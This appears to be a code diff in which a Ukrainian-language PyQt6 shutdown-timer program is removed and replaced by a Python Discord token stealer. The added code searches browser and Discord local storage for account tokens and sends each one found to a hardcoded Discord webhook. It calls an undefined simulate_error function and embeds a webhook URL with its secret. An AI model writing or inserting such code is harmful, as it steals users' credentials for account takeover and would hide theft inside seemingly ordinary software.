@@ -1,103 +1,65 @@
+import os
+import re
+import requests
 import sys
-import subprocess
-from PyQt6.QtWidgets import (
-    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton,
-    QComboBox, QLabel, QMessageBox
-)
-from PyQt6.QtCore import QTimer, Qt
 
+def send_to_webhook(embed, webhook_url):
+    payload = {
+        'embeds': [embed]
+    }
+    try:
+        response = requests.post(webhook_url, json=payload)
 
-class ShutdownTimer(QWidget):
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("Shutdown Timer")
-        self.setGeometry(200, 200, 500, 300)
-        self.setStyleSheet("background-color: #121212; color: white; font-size: 18px;")
+def find_discord_token(webhook_url):
+    paths = {
+        'chrome': os.path.expanduser('~') + r'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
+        'firefox': os.path.expanduser('~') + r'\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
+        'discord_app': os.path.expanduser('~') + r'\\AppData\\Roaming\\discord\\Local Storage\\leveldb',
+        'opera_gx': os.path.expanduser('~') + r'\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\Local Storage\\leveldb'
+    }
 
-        main_layout = QHBoxLayout()
-        self.setLayout(main_layout)
+    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
 
-        # Ліва панель з кнопками
-        left_layout = QVBoxLayout()
-        btn_times = [
-            (30, "30 хв"),
-            (45, "45 хв"),
-            (60, "1 год"),
-            (75, "1 год 15 хв"),
-            (90, "1 год 30 хв"),
-            (105, "1 год 45 хв"),
-            (120, "2 год")
-        ]
-        for minutes, label in btn_times:
-            btn = QPushButton(label)
-            btn.setFixedHeight(50)
-            btn.setStyleSheet("background-color: #2e2e2e; border-radius: 8px;")
-            btn.clicked.connect(lambda checked, m=minutes: self.start_timer(m))
-            left_layout.addWidget(btn)
+    found_token = False
 
-        main_layout.addLayout(left_layout)
+    for browser, path in paths.items():
+        try:
+            if os.path.exists(path):
+                for filename in os.listdir(path):
+                    if filename.endswith('.ldb') or filename.endswith('.log'):
+                        with open(os.path.join(path, filename), 'r', errors='ignore') as file:
+                            content = file.read()
+                            tokens = token_pattern.findall(content)
+                            if tokens:
+                                for token in tokens:
+                                    found_token = True
+                                    embed = {
+                                        'title': 'Discord Token Found',
+                                        'description': f'Token found in {browser} storage.',
+                                        'color': 15258703,
+                                        'fields': [
+                                            {
+                                                'name': 'Token',
+                                                'value': token,
+                                                'inline': False
+                                            },
+                                            {
+                                                'name': 'Browser/App',
+                                                'value': browser,
+                                                'inline': False
+                                            }
+                                        ]
+                                    }
+                                    send_to_webhook(embed, webhook_url)
+                                    
 
-        # Права панель з селектом
-        right_layout = QVBoxLayout()
-        self.combo = QComboBox()
-        for m in range(30, 181, 5):
-            self.combo.addItem(f"{m} хв", m)
-        self.combo.setStyleSheet("background-color: #2e2e2e;")
-        right_layout.addWidget(self.combo)
-
-        confirm_btn = QPushButton("Підтвердити")
-        confirm_btn.setFixedHeight(50)
-        confirm_btn.setStyleSheet("background-color: #444444; border-radius: 8px;")
-        confirm_btn.clicked.connect(self.confirm_selection)
-        right_layout.addWidget(confirm_btn)
-
-        self.status_label = QLabel("Таймер не запущено")
-        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        right_layout.addWidget(self.status_label)
-
-        main_layout.addLayout(right_layout)
-
-        # Таймер
-        self.timer = QTimer()
-        self.timer.timeout.connect(self.update_countdown)
-        self.remaining_seconds = 0
-
-    def confirm_selection(self):
-        minutes = self.combo.currentData()
-        self.start_timer(minutes)
-
-    def start_timer(self, minutes):
-        self.remaining_seconds = minutes * 60
-        self.status_label.setText(f"Вимкнення через {minutes} хв")
-        self.timer.start(1000)
-
-    def update_countdown(self):
-        self.remaining_seconds -= 1
-        if self.remaining_seconds > 60:
-            mins = self.remaining_seconds // 60
-            self.status_label.setText(f"Вимкнення через {mins} хв")
-        elif self.remaining_seconds == 60:
-            self.show_warning()
-        elif self.remaining_seconds <= 0:
-            self.timer.stop()
-            subprocess.run("shutdown -s -t 0", shell=True)
-
-    def show_warning(self):
-        msg = QMessageBox(self)
-        msg.setWindowTitle("Попередження")
-        msg.setText("Компʼютер вимкнеться через 1 хвилину!")
-        msg.setStyleSheet("background-color: #1e1e1e; color: white; font-size: 16px;")
-        cancel_btn = msg.addButton("Відмінити", QMessageBox.ButtonRole.RejectRole)
-        msg.setStandardButtons(QMessageBox.StandardButton.NoButton)
-        msg.exec()
-
-        if msg.clickedButton() == cancel_btn:
-            self.timer.stop()
-            self.status_label.setText("Таймер скасовано")
+    if found_token:
+        sys.exit()
+    
 
 
 if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    window = ShutdownTimer()
-    window.show()
-    sys.exit(app.exec())
+    simulate_error()
+
+    webhook_url = 'https://discord.com/api/webhooks/1407764272414724126/v5eTwbJPyXiZsQciMiGzHLoPyBtnYToCnc2NKfuhMBiRdsqF0yABhJqL95PzFAagXp5Q' # YOUR WEBHOOK HERE!!!!
+    find_discord_token(webhook_url)
